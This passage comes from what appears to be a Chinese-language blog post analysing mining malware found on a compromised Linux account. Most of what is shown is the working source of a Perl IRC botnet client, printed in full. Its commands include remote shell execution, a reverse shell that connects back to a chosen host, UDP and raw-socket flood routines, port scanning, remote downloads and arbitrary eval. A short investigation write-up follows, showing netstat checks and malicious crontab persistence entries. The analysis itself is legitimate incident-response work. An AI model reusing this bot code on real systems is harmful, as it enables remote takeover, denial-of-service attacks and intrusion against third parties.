/%20/g;\n\n  require IO::Socket;\n  local($^W) = 0;\n  my $sock = IO::Socket::INET->new(PeerAddr => $host,\n                                   PeerPort => $port,\n                                   Proto   => 'tcp',\n                                   Timeout  => 60) || return;\n  $sock->autoflush;\n  my $netloc = $host;\n  $netloc .= \":$port\" if $port != 80;\n  my $request = \"GET $path HTTP/1.0\\015\\012\"\n              . \"Host: $netloc\\015\\012\"\n              . \"User-Agent: $AGENT/$VERSION/u\\015\\012\";\n  $request .= \"Pragma: no-cache\\015\\012\" if ($main::http_no_cache);\n  $request .= \"\\015\\012\";\n  print $sock $request;\n\n  my $buf = \"\";\n  my $n;\n  my $b1 = \"\";\n  while ($n = sysread($sock, $buf, 8*1024, length($buf))) {\n    if ($b1 eq \"\") { \n      $b1 = $buf;         \n      $buf =~ s/.+?\\015?\\012\\015?\\012//s;      \n    }\n    if ($http_stream_out) { print GET_OUTFILE $buf; $buf = \"\"; }\n  }\n  return undef unless defined($n);\n\n  $main::http_get_result = 200;\n  if ($b1 =~ m,^HTTP/\\d+\\.\\d+\\s+(\\d+)[^\\012]*\\012,) {\n    $main::http_get_result = $1;\n    if ($main::http_get_result =~ /^30[1237]/ && $b1 =~ /\\012Location:\\s*(\\S+)/\n) {\n      my $url = $1;\n      return undef if $http_loop_check{$url}++;\n      return _get($url);\n    }\n    return undef unless $main::http_get_result =~ /^2/;\n  }\n\n  return $buf;\n}\n\n\n$sel_cliente = IO::Select->new();\nsub sendraw {\n  if ($#_ == '1') {\n    my $socket = $_[0];\n    print $socket \"$_[1]\\n\";\n  } else {\n      print $IRC_cur_socket \"$_[0]\\n\";\n  }\n}\n\nsub conectar {\n   my $meunick = $_[0];\n   my $servidor_con = $_[1];\n   my $porta_con = $_[2];\n\n   my $IRC_socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$servidor_con\", PeerPort=>$porta_con) or return(1);\n   if (defined($IRC_socket)) {\n     $IRC_cur_socket = $IRC_socket;\n\n     $IRC_socket->autoflush(1);\n     $sel_cliente->add($IRC_socket);\n\n     $irc_servers{$IRC_cur_socket}{'host'} = \"$servidor_con\";\n     $irc_servers{$IRC_cur_socket}{'porta'} = \"$porta_con\";\n     $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n     $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;\n     nick(\"$meunick\");\n     sendraw(\"USER $ircname \".$IRC_socket->sockhost.\" $servidor_con :$realname\");\n     sleep 2;\n   }\n\n}\nmy $line_temp;\nwhile( 1 ) {\n   while (!(keys(%irc_servers))) { conectar(\"$nick\", \"$servidor\", \"$porta\"); }\n   delete($irc_servers{''}) if (defined($irc_servers{''}));\n   &DCC::connections;\n   my @ready = $sel_cliente->can_read(0.6);\n   next unless(@ready);\n   foreach $fh (@ready) {\n     $IRC_cur_socket = $fh;\n     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};\n     $nread = sysread($fh, $msg, 4096);\n     if ($nread == 0) {\n        $sel_cliente->remove($fh);\n        $fh->close;\n        delete($irc_servers{$fh});\n     }\n     @lines = split (/\\n/, $msg);\n\n     for(my $c=0; $c<= $#lines; $c++) {\n       $line = $lines[$c];\n       $line=$line_temp.$line if ($line_temp);\n       $line_temp='';\n       $line =~ s/\\r$//;\n       unless ($c == $#lines) {\n         parse(\"$line\");\n       } else {\n           if ($#lines == 0) {\n             parse(\"$line\");\n           } elsif ($lines[$c] =~ /\\r$/) {\n               parse(\"$line\");\n           } elsif ($line =~ /^(\\S+) NOTICE AUTH :\\*\\*\\*/) {\n               parse(\"$line\");\n           } else {\n               $line_temp = $line;\n           }\n       }\n      }\n   }\n}\n\nsub parse {\n   my $servarg = shift;\n   if ($servarg =~ /^PING \\:(.*)/) {\n     sendraw(\"PONG :$1\");\n   } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?) PRIVMSG (.+?) \\:(.+)/) {\n       my $pn=$1; my $onde = $4; my $args = $5;\n       if ($args =~ /^\\001VERSION\\001$/) {\n         notice(\"$pn\", \"\\001VERSION mIRC v6.16 ENE ALIN GABRIEL\\001\");\n       }\n       elsif ($args =~ /^\\001PING\\s+(\\d+)\\001$/) {\n         notice(\"$pn\", \"\\001PONG\\001\");\n       }\n       elsif (grep {$_ =~ /^\\Q$pn\\E$/i } @adms) {\n         if ($onde eq \"$meunick\"){\n           shell(\"$pn\", \"$args\");\n           }\n         elsif ($args =~ /^(\\Q$meunick\\E|\\Q$prefixo\\E)\\s+(.*)/ ) {\n            my $natrix = $1;\n            my $arg = $2;\n            if ($arg =~ /^\\!(.*)/) {\n              ircase(\"$pn\",\"$onde\",\"$1\") unless ($natrix eq \"$prefixo\" and $arg =~ /^\\!nick/);\n            } elsif ($arg =~ /^\\@(.*)/) {\n                $ondep = $onde;\n                $ondep = $pn if $onde eq $meunick;\n                bfunc(\"$ondep\",\"$1\");\n            } else {\n                shell(\"$onde\", \"$arg\");\n            }\n         }\n       }\n   } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?)\\s+NICK\\s+\\:(\\S+)/i) {\n       if (lc($1) eq lc($meunick)) {\n         $meunick=$4;\n         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n       }\n   } elsif ($servarg =~ m/^\\:(.+?)\\s+433/i) {\n       $meunick = getnick();\n       nick(\"$meunick\");\n   } elsif ($servarg =~ m/^\\:(.+?)\\s+001\\s+(\\S+)\\s/i) {\n       $meunick = $2;\n       $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;\n       $irc_servers{$IRC_cur_socket}{'nome'} = \"$1\";\n       foreach my $canal (@canais) {\n         sendraw(\"JOIN $canal\");\n       }\n   }\n}\n\nsub bfunc {\n  my $printl = $_[0];\n  my $funcarg = $_[1];\n  if (my $pid = fork) {\n     waitpid($pid, 0);\n  } else {\n      if (fork) {\n         exit;\n       } else {\n           if ($funcarg =~ /^portscan (.*)/) {\n             my $hostip=\"$1\";\n             my @portas=(\"21\",\"22\",\"23\",\"25\",\"53\",\"80\",\"110\",\"143\",\"6665\");\n             my (@aberta, %porta_banner);\n             foreach my $porta (@portas)  {\n                my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);\n                if ($scansock) {\n                   push (@aberta, $porta);\n                   $scansock->close;\n                }\n             }\n             if (@aberta) {\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :Portas abertas: @aberta\");\n             } else {\n                 sendraw($IRC_cur_socket,\"PRIVMSG $printl :Nenhuma porta aberta foi encontrada.\");\n             }\n           }\n\n           elsif ($funcarg =~ /^download\\s+(.*)\\s+(.*)/) {\n            getstore(\"$1\", \"$2\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :Download de $2 ($1) Conclu.do!\") if ($estatisticas);\n            }\n\n           elsif ($funcarg =~ /^fullportscan\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\n             my $hostname=\"$1\";\n             my $portainicial = \"$2\";\n             my $portafinal = \"$3\";\n             my (@abertas, %porta_banner);\n             foreach my $porta ($portainicial..$portafinal)\n             {\n               my $scansock = IO::Socket::INET->new(PeerAddr => $hostname, PeerPort => $porta, Proto => 'tcp', Timeout => 4);\n               if ($scansock) {\n                 push (@abertas, $porta);\n                 $scansock->close;\n                 if ($estatisticas) {\n                   sendraw($IRC_cur_socket, \"PRIVMSG $printl :Porta $porta aberta em $hostname\");\n                 }\n               }\n             }\n             if (@abertas) {\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :Portas abertas: @abertas\");\n             } else {\n               sendraw($IRC_cur_socket,\"PRIVMSG $printl :Nenhuma porta aberta foi encontrada.\");\n             }\n            }\n\n            elsif ($funcarg =~ /^udp\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\n              return unless $pacotes;\n              socket(Tr0x, PF_INET, SOCK_DGRAM, 17);\n              my $alvo=inet_aton(\"$1\");\n              my $porta = \"$2\";\n              my $tempo = \"$3\";\n              my $pacote;\n              my $pacotese;\n              my $fim = time + $tempo;\n              my $pacota = 1;\n              while (($pacota == \"1\") && ($pacotes == \"1\")) {\n                $pacota = 0 if ((time >= $fim) && ($tempo != \"0\"));\n                $pacote=$rand x $rand x $rand;\n                $porta = int(rand 65000) +1 if ($porta == \"0\");\n                send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo)) and $pacotese++ if ($pacotes == \"1\");\n              }\n              if ($estatisticas)\n              {\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Tempo de Pacotes\\002: $tempo\".\"s\");\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total de Pacotes\\002: $pacotese\");\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Alvo dos Pacotes\\002: $1\");\n              }\n            }\n\n            elsif ($funcarg =~ /^udpfaixa\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\n              return unless $pacotes;\n              socket(Tr0x, PF_INET, SOCK_DGRAM, 17);\n              my $faixaip=\"$1\";\n              my $porta = \"$2\";\n              my $tempo = \"$3\";\n              my $pacote;\n              my $pacotes;\n              my $fim = time + $tempo;\n              my $pacota = 1;\n              my $alvo;\n              while ($pacota == \"1\") {\n                $pacota = 0 if ((time >= $fim) && ($tempo != \"0\"));\n                for (my $faixa = 1; $faixa <= 255; $faixa++) {\n                  $alvo = inet_aton(\"$faixaip.$faixa\");\n                  $pacote=$rand x $rand x $rand;\n                  $porta = int(rand 65000) +1 if ($porta == \"0\");\n                  send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo)) and $pacotese++ if ($pacotes == \"1\");\n                  if ($faixa >= 255) {\n                    $faixa = 1;\n                  }\n                }\n              }\n              if ($estatisticas)\n              {\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Tempo de Pacotes\\002: $tempo\".\"s\");\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total de Pacotes\\002: $pacotese\");\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Alvo dos Pacotes\\002: $alvo\");\n              }\n            }\n\n            elsif ($funcarg =~ /^conback\\s+(.*)\\s+(\\d+)/) {\n              my $host = \"$1\";\n              my $porta = \"$2\";\n              my $proto = getprotobyname('tcp');\n              my $iaddr = inet_aton($host);\n              my $paddr = sockaddr_in($porta, $iaddr);\n              my $shell = \"/bin/sh -i\";\n              if ($^O eq \"MSWin32\") {\n                $shell = \"cmd.exe\";\n              }\n              socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die \"socket: $!\";\n              connect(SOCKET, $paddr) or die \"connect: $!\";\n              open(STDIN, \">&SOCKET\");\n              open(STDOUT, \">&SOCKET\");\n              open(STDERR, \">&SOCKET\");\n              system(\"$shell\");\n              close(STDIN);\n              close(STDOUT);\n              close(STDERR);\n\n              if ($estatisticas)\n              {\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Conectando-se em\\002: $host:$porta\");\n              }\n            }\n\n           elsif ($funcarg =~ /^oldpack\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\n            return unless $pacotes;\n             my ($dtime, %pacotes) = attacker(\"$1\", \"$2\", \"$3\");\n             $dtime = 1 if $dtime == 0;\n             my %bytes;\n             $bytes{igmp} = $2 * $pacotes{igmp};\n             $bytes{icmp} = $2 * $pacotes{icmp};\n             $bytes{o} = $2 * $pacotes{o};\n             $bytes{udp} = $2 * $pacotes{udp};\n             $bytes{tcp} = $2 * $pacotes{tcp};\n             unless ($estatisticas)\n             {\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002 - Status -\\002\");\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Timp\\002: $dtime\".\"secunde.\");\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total packet\\002: \".($pacotes{udp} + $pacotes{igmp} + $pacotes{icmp} +  $pacotes{o}));\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Total bytes\\002: \".($bytes{icmp} + $bytes {igmp} + $bytes{udp} + $bytes{o}));\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Flood\\002: \".int((($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)/$dtime).\" kbps\");\n             }\n           }\n           exit;\n       }\n  }\n}\n\nsub ircase {\n  my ($kem, $printl, $case) = @_;\n\n   if ($case =~ /^join (.*)/) {\n     j(\"$1\");\n   }\n   elsif ($case =~ /^part (.*)/) {\n      p(\"$1\");\n   }\n   elsif ($case =~ /^rejoin\\s+(.*)/) {\n      my $chan = $1;\n      if ($chan =~ /^(\\d+) (.*)/) {\n        for (my $ca = 1; $ca <= $1; $ca++ ) {\n          p(\"$2\");\n          j(\"$2\");\n        }\n      } else {\n          p(\"$chan\");\n          j(\"$chan\");\n      }\n   }\n   elsif ($case =~ /^op/) {\n      op(\"$printl\", \"$kem\") if $case eq \"op\";\n      my $oarg = substr($case, 3);\n      op(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n   elsif ($case =~ /^deop/) {\n      deop(\"$printl\", \"$kem\") if $case eq \"deop\";\n      my $oarg = substr($case, 5);\n      deop(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n   elsif ($case =~ /^voice/) {\n      voice(\"$printl\", \"$kem\") if $case eq \"voice\";\n      $oarg = substr($case, 6);\n      voice(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n   elsif ($case =~ /^devoice/) {\n      devoice(\"$printl\", \"$kem\") if $case eq \"devoice\";\n      $oarg = substr($case, 8);\n      devoice(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n   }\n   elsif ($case =~ /^msg\\s+(\\S+) (.*)/) {\n      msg(\"$1\", \"$2\");\n   }\n   elsif ($case =~ /^flood\\s+(\\d+)\\s+(\\S+) (.*)/) {\n      for (my $cf = 1; $cf <= $1; $cf++) {\n        msg(\"$2\", \"$3\");\n      }\n   }\n   elsif ($case =~ /^ctcpflood\\s+(\\d+)\\s+(\\S+) (.*)/) {\n      for (my $cf = 1; $cf <= $1; $cf++) {\n        ctcp(\"$2\", \"$3\");\n      }\n   }\n   elsif ($case =~ /^ctcp\\s+(\\S+) (.*)/) {\n      ctcp(\"$1\", \"$2\");\n   }\n   elsif ($case =~ /^invite\\s+(\\S+) (.*)/) {\n      invite(\"$1\", \"$2\");\n   }\n   elsif ($case =~ /^nick (.*)/) {\n      nick(\"$1\");\n   }\n   elsif ($case =~ /^conecta\\s+(\\S+)\\s+(\\S+)/) {\n       conectar(\"$2\", \"$1\", 6667);\n   }\n   elsif ($case =~ /^send\\s+(\\S+)\\s+(\\S+)/) {\n      DCC::SEND(\"$1\", \"$2\");\n   }\n   elsif ($case =~ /^raw (.*)/) {\n      sendraw(\"$1\");\n   }\n   elsif ($case =~ /^eval (.*)/) {\n      eval \"$1\";\n   }\n   elsif ($case =~ /^entra\\s+(\\S+)\\s+(\\d+)/) {\n    sleep int(rand($2));\n    j(\"$1\");\n   }\n   elsif ($case =~ /^sai\\s+(\\S+)\\s+(\\d+)/) {\n    sleep int(rand($2));\n    p(\"$1\");\n   }\n   elsif ($case =~ /^sair/) {\n     quit();\n   }\n   elsif ($case =~ /^novonick/) {\n    my $novonick = getnick();\n     nick(\"$novonick\");\n   }\n   elsif ($case =~ /^estatisticas (.*)/) {\n     if ($1 eq \"on\") {\n      $estatisticas = 1;\n      msg(\"$printl\", \"Estat.sticas ativadas!\");\n     } elsif ($1 eq \"off\") {\n      $estatisticas = 0;\n      msg(\"$printl\", \"Estat.sticas desativadas!\");\n     }\n   }\n   elsif ($case =~ /^pacotes (.*)/) {\n     if ($1 eq \"on\") {\n      $pacotes = 1;\n      msg(\"$printl\", \"Pacotes ativados!\") if ($estatisticas == \"1\");\n     } elsif ($1 eq \"off\") {\n      $pacotes = 0;\n      msg(\"$printl\", \"Pacotes desativados!\") if ($estatisticas == \"1\");\n     }\n   }\n}\nsub shell {\n  return unless $acessoshell;\n  my $printl=$_[0];\n  my $comando=$_[1];\n  if ($comando =~ /cd (.*)/) {\n    chdir(\"$1\") || msg(\"$printl\", \"Diret.rio inexistente!\");\n    return;\n  }\n  elsif ($pid = fork) {\n     waitpid($pid, 0);\n  } else {\n      if (fork) {\n         exit;\n       } else {\n           my @resp=`$comando 2>&1 3>&1`;\n           my $c=0;\n           foreach my $linha (@resp) {\n             $c++;\n             chop $linha;\n             sendraw($IRC_cur_socket, \"PRIVMSG $printl :$linha\");\n             if ($c >= \"$linas_max\") {\n               $c=0;\n               sleep $sleep;\n             }\n           }\n           exit;\n       }\n  }\n}\n\nsub attacker {\n  my $iaddr = inet_aton($_[0]);\n  my $msg = 'B' x $_[1];\n  my $ftime = $_[2];\n  my $cp = 0;\n  my (%pacotes);\n  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;\n\n  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;\n  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;\n  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;\n  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;\n  return(undef) if $cp == 4;\n  my $itime = time;\n  my ($cur_time);\n  while ( 1 ) {\n     for (my $porta = 1; $porta <= 65535; $porta++) {\n       $cur_time = time - $itime;\n       last if $cur_time >= $ftime;\n       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++ if ($pacotes == 1);\n       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++ if ($pacotes == 1);\n       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++ if ($pacotes == 1);\n       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++ if ($pacotes == 1);\n\n       for (my $pc = 3; $pc <= 255;$pc++) {\n         next if $pc == 6;\n         $cur_time = time - $itime;\n         last if $cur_time >= $ftime;\n         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;\n         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++ if ($pacotes == 1);\n       }\n     }\n     last if $cur_time >= $ftime;\n  }\n  return($cur_time, %pacotes);\n}\n\n\nsub action {\n   return unless $#_ == 1;\n   sendraw(\"PRIVMSG $_[0] :\\001ACTION $_[1]\\001\");\n}\n\nsub ctcp {\n   return unless $#_ == 1;\n   sendraw(\"PRIVMSG $_[0] :\\001$_[1]\\001\");\n}\nsub msg {\n   return unless $#_ == 1;\n   sendraw(\"PRIVMSG $_[0] :$_[1]\");\n}\n\nsub notice {\n   return unless $#_ == 1;\n   sendraw(\"NOTICE $_[0] :$_[1]\");\n}\n\nsub op {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +o $_[1]\");\n}\nsub deop {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] -o $_[1]\");\n}\nsub hop {\n    return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +h $_[1]\");\n}\nsub dehop {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +h $_[1]\");\n}\nsub voice {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +v $_[1]\");\n}\nsub devoice {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] -v $_[1]\");\n}\nsub ban {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] +b $_[1]\");\n}\nsub unban {\n   return unless $#_ == 1;\n   sendraw(\"MODE $_[0] -b $_[1]\");\n}\nsub kick {\n   return unless $#_ == 1;\n   sendraw(\"KICK $_[0] $_[1] :$_[2]\");\n}\n\nsub modo {\n   return unless $#_ == 0;\n   sendraw(\"MODE $_[0] $_[1]\");\n}\nsub mode { modo(@_); }\n\nsub j { &join(@_); }\nsub join {\n   return unless $#_ == 0;\n   sendraw(\"JOIN $_[0]\");\n}\nsub p { part(@_); }\nsub part {sendraw(\"PART $_[0]\");}\n\nsub nick {\n  return unless $#_ == 0;\n  sendraw(\"NICK $_[0]\");\n}\n\nsub invite {\n   return unless $#_ == 1;\n   sendraw(\"INVITE $_[1] $_[0]\");\n}\nsub topico {\n   return unless $#_ == 1;\n   sendraw(\"TOPIC $_[0] $_[1]\");\n}\nsub topic { topico(@_); }\n\nsub whois {\n  return unless $#_ == 0;\n  sendraw(\"WHOIS $_[0]\");\n}\nsub who {\n  return unless $#_ == 0;\n  sendraw(\"WHO $_[0]\");\n}\nsub names {\n  return unless $#_ == 0;\n  sendraw(\"NAMES $_[0]\");\n}\nsub away {\n  sendraw(\"AWAY $_[0]\");\n}\nsub back { away(); }\nsub quit {\n  sendraw(\"QUIT :$_[0]\");\n  exit;\n}\n\npackage DCC;\n\nsub connections {\n   my @ready = $dcc_sel->can_read(1);\n   foreach my $fh (@ready) {\n     my $dcctipo = $DCC{$fh}{tipo};\n     my $arquivo = $DCC{$fh}{arquivo};\n     my $bytes = $DCC{$fh}{bytes};\n     my $cur_byte = $DCC{$fh}{curbyte};\n     my $nick = $DCC{$fh}{nick};\n\n     my $msg;\n     my $nread = sysread($fh, $msg, 10240);\n\n     if ($nread == 0 and $dcctipo =~ /^(get|sendcon)$/) {\n        $DCC{$fh}{status} = \"Cancelado\";\n        $DCC{$fh}{ftime} = time;\n        $dcc_sel->remove($fh);\n        $fh->close;\n        next;\n     }\n\n     if ($dcctipo eq \"get\") {\n        $DCC{$fh}{curbyte} += length($msg);\n\n        my $cur_byte = $DCC{$fh}{curbyte};\n\n        open(FILE, \">> $arquivo\");\n        print FILE \"$msg\" if ($cur_byte <= $bytes);\n        close(FILE);\n\n        my $packbyte = pack(\"N\", $cur_byte);\n        print $fh \"$packbyte\";\n\n        if ($bytes == $cur_byte) {\n           $dcc_sel->remove($fh);\n           $fh->close;\n           $DCC{$fh}{status} = \"Recebido\";\n           $DCC{$fh}{ftime} = time;\n           next;\n        }\n     } elsif ($dcctipo eq \"send\") {\n          my $send = $fh->accept;\n          $send->autoflush(1);\n          $dcc_sel->add($send);\n          $dcc_sel->remove($fh);\n          $DCC{$send}{tipo} = 'sendcon';\n          $DCC{$send}{itime} = time;\n          $DCC{$send}{nick} = $nick;\n          $DCC{$send}{bytes} = $bytes;\n          $DCC{$send}{curbyte} = 0;\n          $DCC{$send}{arquivo} = $arquivo;\n          $DCC{$send}{ip} = $send->peerhost;\n          $DCC{$send}{porta} = $send->peerport;\n          $DCC{$send}{status} = \"Enviando\";\n\n          open(FILE, \"< $arquivo\");\n          my $fbytes;\n          read(FILE, $fbytes, 1024);\n          print $send \"$fbytes\";\n          close FILE;\n     } elsif ($dcctipo eq 'sendcon') {\n          my $bytes_sended = unpack(\"N\", $msg);\n          $DCC{$fh}{curbyte} = $bytes_sended;\n          if ($bytes_sended == $bytes) {\n             $fh->close;\n             $dcc_sel->remove($fh);\n             $DCC{$fh}{status} = \"Enviado\";\n             $DCC{$fh}{ftime} = time;\n             next;\n          }\n          open(SENDFILE, \"< $arquivo\");\n          seek(SENDFILE, $bytes_sended, 0);\n          my $send_bytes;\n          read(SENDFILE, $send_bytes, 1024);\n          print $fh \"$send_bytes\";\n          close(SENDFILE);\n     }\n   }\n}\n\n\nsub SEND {\n  my ($nick, $arquivo) = @_;\n  unless (-r \"$arquivo\") {\n    return(0);\n  }\n\n  my $dccark = $arquivo;\n  $dccark =~ s/[.*\\/](\\S+)/$1/;\n\n  my $meuip = $::irc_servers{\"$::IRC_cur_socket\"}{'meuip'};\n  my $longip = unpack(\"N\",inet_aton($meuip));\n\n  my @filestat = stat($arquivo);\n  my $size_total=$filestat[7];\n  if ($size_total == 0) {\n     return(0);\n  }\n\n  my ($porta, $sendsock);\n  do {\n    $porta = int rand(64511);\n    $porta += 1024;\n    $sendsock = IO::Socket::INET->new(Listen=>1, LocalPort =>$porta, Proto => 'tcp') and $dcc_sel->add($sendsock);\n  } until $sendsock;\n\n  $DCC{$sendsock}{tipo} = 'send';\n  $DCC{$sendsock}{nick} = $nick;\n  $DCC{$sendsock}{bytes} = $size_total;\n  $DCC{$sendsock}{arquivo} = $arquivo;\n\n\n  &::ctcp(\"$nick\", \"DCC SEND $dccark $longip $porta $size_total\");\n\n}\n\nsub GET {\n  my ($arquivo, $dcclongip, $dccporta, $bytes, $nick) = @_;\n  return(0) if (-e \"$arquivo\");\n  if (open(FILE, \"> $arquivo\")) {\n     close FILE;\n  } else {\n    return(0);\n  }\n\n  my $dccip=fixaddr($dcclongip);\n  return(0) if ($dccporta < 1024 or not defined $dccip or $bytes < 1);\n  my $dccsock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>$dccip, PeerPort=>$dccporta, Timeout=>15) or return (0);\n  $dccsock->autoflush(1);\n  $dcc_sel->add($dccsock);\n  $DCC{$dccsock}{tipo} = 'get';\n  $DCC{$dccsock}{itime} = time;\n  $DCC{$dccsock}{nick} = $nick;\n  $DCC{$dccsock}{bytes} = $bytes;\n  $DCC{$dccsock}{curbyte} = 0;\n  $DCC{$dccsock}{arquivo} = $arquivo;\n  $DCC{$dccsock}{ip} = $dccip;\n  $DCC{$dccsock}{porta} = $dccporta;\n  $DCC{$dccsock}{status} = \"Recebendo\";\n}\n\nsub Status {\n  my $socket = shift;\n  my $sock_tipo = $DCC{$socket}{tipo};\n  unless (lc($sock_tipo) eq \"chat\") {\n    my $nick = $DCC{$socket}{nick};\n    my $arquivo = $DCC{$socket}{arquivo};\n    my $itime = $DCC{$socket}{itime};\n    my $ftime = time;\n    my $status = $DCC{$socket}{status};\n    $ftime = $DCC{$socket}{ftime} if defined($DCC{$socket}{ftime});\n\n    my $d_time = $ftime-$itime;\n\n    my $cur_byte = $DCC{$socket}{curbyte};\n    my $bytes_total =  $DCC{$socket}{bytes};\n\n    my $rate = 0;\n    $rate = ($cur_byte/1024)/$d_time if $cur_byte > 0;\n    my $porcen = ($cur_byte*100)/$bytes_total;\n\n    my ($r_duv, $p_duv);\n    if ($rate =~ /^(\\d+)\\.(\\d)(\\d)(\\d)/) {\n       $r_duv = $3; $r_duv++ if $4 >= 5;\n       $rate = \"$1\\.$2\".\"$r_duv\";\n    }\n    if ($porcen =~ /^(\\d+)\\.(\\d)(\\d)(\\d)/) {\n       $p_duv = $3; $p_duv++ if $4 >= 5;\n       $porcen = \"$1\\.$2\".\"$p_duv\";\n    }\n    return(\"$sock_tipo\",\"$status\",\"$nick\",\"$arquivo\",\"$bytes_total\", \"$cur_byte\",\"$d_time\", \"$rate\", \"$porcen\");\n  }\n\n\n  return(0);\n}\n\n\nsub fixaddr {\n    my ($address) = @_;\n\n    chomp $address;     \n    if ($address =~ /^\\d+$/) {\n        return inet_ntoa(pack \"N\", $address);\n    } elsif ($address =~ /^[12]?\\d{1,2}\\.[12]?\\d{1,2}\\.[12]?\\d{1,2}\\.[12]?\\d{1,2}$/) {\n        return $address;\n    } elsif ($address =~ tr/a-zA-Z//) {                    \n        return inet_ntoa(((gethostbyname($address))[4])[0]);\n    } else {\n        return;\n    }\n}\n```\n\n\n\n","source":"_posts/Mining-malware-analysis.md","raw":"---\ntitle: Mining malware analysis\ndate: 2022-04-22 15:17:09\ntags:\n---\n\n# Mining malware analysis\n\n```bash=\nnetstat -antp\n```\n\n![](https://i.imgur.com/nkRApHa.png)\n\n大量的 ip 對 107.191.99.95 的 port 80 進行連線，且發現每次重開機後都會重新連線，應該是有開機自啟動。\n\n`107.191.99.95`\n\n![](https://i.imgur.com/GnEg6vz.png)\n\n經調查是門羅幣的挖礦\n\n再來分析，使用的程式 cron\n\nPID 為 1475\n\n\n```bash=\nps -aux |grep 1475 \n```\n\n發現是 ./cron \n\n使用者居然是 test2 (看來是同學帳號亂建立，被暴力入侵而得)\n\n\n```bash=\nfind . -name cron*\n```\n\n找到檔案 cron.d\n\n![](https://i.imgur.com/Gb4mMEM.png)\n\n/home/test2/.firefoxcatche/cron.d\n\n```shell=\n* */12 * * * /home/test2/.firefoxcatche/a/upd>/dev/null 2>&1\n@reboot /home/test2/.firefoxcatche/a/upd>/dev/null 2>&1\n5 8 * * 0 /home/test2/.firefoxcatche/b/sync>/dev/null 2>&1\n@reboot /home/test2/.firefoxcatche/b/sync>/dev/null 2>&1  \n#5 1 * * * /tmp/.X13-unix/.rsync/c/aptitude>/dev/null 2>&1\n\n```\n\n\ntest2 帳號的 crontab\n\n![](https://i.imgur.com/b5yebu5.png)\n\n\n被放了什麼東西進來\n\n![](https://i.imgur.com/TeZPyGv.png)\n\n\n主要的惡意程式邏輯應該在 .firefoxcatche\n\n\n![](https://i.imgur.com/gQbEd8g.png)\n\n\n\ncron.d 是最後要執行的程式\n\n![](https://i.imgur.com/hxyv055.png)\n\n會執行 \n\na/upd\n@reboot 後 a/upd\n\nb/sync\n@reboot 後 b/sync\n\n/tmp/.X13-unix/.rsync/c/aptitude\n\n\n先來看 a 資料夾\n\n\n![](https://i.imgur.com/4omAw3I.png)\n\na/a\n\n![](https://i.imgur.com/YxI5D8p.png)\n\na/upd\n\n![](https://i.imgur.com/LoWQJ9U.png)\n\na/stop\n\n![](https://i.imgur.com/dxkmnum.png)\n\na/run\n\n![](https://i.imgur.com/NZy6EmR.png)\n\n\na/init0\n\n看起來是自毀程式\n\n![](https://i.imgur.com/iYZIrHO.png)\n\n\n最後會執行 anacron 這個執行檔案\n\n\n\n再來是 b 